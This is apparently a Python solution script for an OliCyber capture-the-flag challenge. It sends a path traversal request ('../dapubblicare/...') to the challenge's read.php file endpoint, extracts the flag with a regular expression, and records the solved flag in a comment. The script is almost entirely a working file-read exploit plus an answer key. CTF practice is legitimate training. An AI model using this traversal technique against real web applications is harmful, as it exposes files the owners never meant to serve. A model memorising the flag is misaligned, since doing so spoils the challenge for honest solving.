import requests
import re

site = "http://trova-le-soluzioni-2.challs.olicyber.it"

r = requests.get(f"{site}/read.php?file=../dapubblicare/20240310.txt").text

match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

#flag{i0_n0n_stud13r0_m41!}